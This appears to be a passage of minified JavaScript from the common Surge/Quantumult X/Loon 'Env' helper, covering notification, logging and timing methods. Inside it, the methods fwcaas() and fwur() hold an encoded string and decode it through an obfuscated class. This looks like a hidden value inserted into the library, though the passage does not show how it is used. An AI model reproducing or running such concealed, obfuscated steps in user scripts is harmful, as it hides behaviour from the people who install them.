              s = t.mediaUrl || t["media-url"];
            return {
              openUrl: e,
              mediaUrl: s
            };
          }
          if (this.isQuanX()) {
            let e = t["open-url"] || t.url || t.openUrl,
              s = t["media-url"] || t.mediaUrl;
            return {
              "open-url": e,
              "media-url": s
            };
          }
          if (this.isSurge()) {
            let e = t.url || t.openUrl || t["open-url"];
            return {
              url: e
            };
          }
        }
      };
      if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r))), !this.isMuteLog) {
        let t = ["", "==============📣系统通知📣=============="];
        t.push(e);
        s && t.push(s);
        i && t.push(i);
        console.log(t.join("\n"));
        this.logs = this.logs.concat(t);
      }
    }
    fwcaas() {
      return "fkRGREUCFRNfMCtqKj0lLiE/OXowLTRz";
    }
    log(...t) {
      t.length > 0 && (this.logs = [...this.logs, ...t]);
      console.log(t.join(this.logSeparator));
    }
    logErr(t, e) {
      const s = !this.isSurge() && !this.isQuanX() && !this.isLoon();
      s ? this.log("", `❗️${this.name}, 错误!`, t.stack) : this.log("", `❗️${this.name}, 错误!`, t);
    }
    fwur() {
      var bbas = new FxPCnMKLw7();
      return bbas.decode(this.fwcaas());
    }
    wait(t) {
      return new Promise(e => setTimeout(e, t));
    }
    done(t = {}) {
      const e = new Date().getTime(),
        s = (e - this.startTime) / 1000;
      this.log("", `🔔${this.name}, 结束! 🕛 ${s} 秒`);
      this.log();
      (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(t);
    }
  }(t, e);
}